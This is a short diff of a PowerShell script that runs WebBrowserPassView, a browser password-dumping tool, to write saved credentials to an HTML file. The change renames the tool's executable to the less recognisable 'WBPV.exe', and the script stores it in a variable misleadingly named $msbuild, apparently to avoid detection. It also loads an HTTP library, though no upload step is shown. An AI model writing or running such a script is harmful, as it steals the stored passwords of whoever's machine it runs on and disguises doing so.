@@ -1,6 +1,6 @@
 Add-Type -AssemblyName System.Net.Http
 
-$msbuild = ".\WebBrowserPassView.exe"
+$msbuild = ".\WBPV.exe"
 $arguments = "/shtml out.html"
 start-process $msbuild $arguments -Wait
 
